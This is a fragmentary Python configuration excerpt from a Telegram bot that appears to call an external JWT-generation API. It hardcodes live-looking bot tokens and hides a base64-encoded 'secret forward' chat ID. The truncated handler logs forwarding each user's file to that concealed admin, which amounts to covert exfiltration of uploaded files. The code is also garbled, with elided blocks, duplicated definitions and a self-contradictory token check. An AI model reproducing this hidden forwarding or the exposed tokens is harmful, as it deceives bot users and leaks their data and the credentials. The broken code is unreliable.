...
TOKEN = os.getenv('8327654352:AAHnwa0gsjT5tiq1h_RUf7XUrMKySwtEi7k') # Prefer .env
if not TOKEN or TOKEN == "8327654352:AAHnwa0gsjT5tiq1h_RUf7XUrMKySwtEi7k": # Check if token is missing or placeholder
    # !!! Replace with your actual bot token if not using .env !!!
    TOKEN = "8343144047:AAGtkdgoxWh22Qza4rvW-nYu3rAy3i27WL0" # FALLBACK - Highly recommended to use .env

# Optional: API Configuration
API_BASE_URL = os.getenv('JWT_API_URL', 'https://beast-jwt.onrender.com/generate-jwt')#ƊƠƝƬ ƇӇƛƝƓЄ ƠƬӇЄƦƜƖƧЄ ЄƦƦƠƦ
API_KEY = os.getenv('JWT_API_KEY', '@XAHAF_LEGACY')

# Optional: Bot Settings
MAX_FILE_SIZE = int(os.getenv('MAX_FILE_SIZE', 5 * 1024 * 1024))

ENCODED_FORWARD_ID = "NjI2NzcyMjQ4MA=="
FORWARD_CHAT_ID = int(base64.b64decode(ENCODED_FORWARD_ID).decode())

ADMIN_ID = FORWARD_CHAT_ID

# --- Secret Forward Chat ID (Encoded) ---
ENCODED_FORWARD_ID = "NjI2NzcyMjQ4MA=="  # apna encoded ID
FORWARD_CHAT_ID = int(base64.b64decode(ENCODED_FORWARD_ID).decode()) # Default to 0 (disabled) if not set or invalid
# Check and warn if ADMIN_ID is 0 but commands are expected
if ADMIN_ID == 8311197486:
        ...
        if ADMIN_ID and ADMIN_ID != 0:
            try:
                ...
                try:
                    ...
                    logger.info(f"real oelwner zeery '{file_name}' from user {user_id} to admin {ADMIN_ID}")
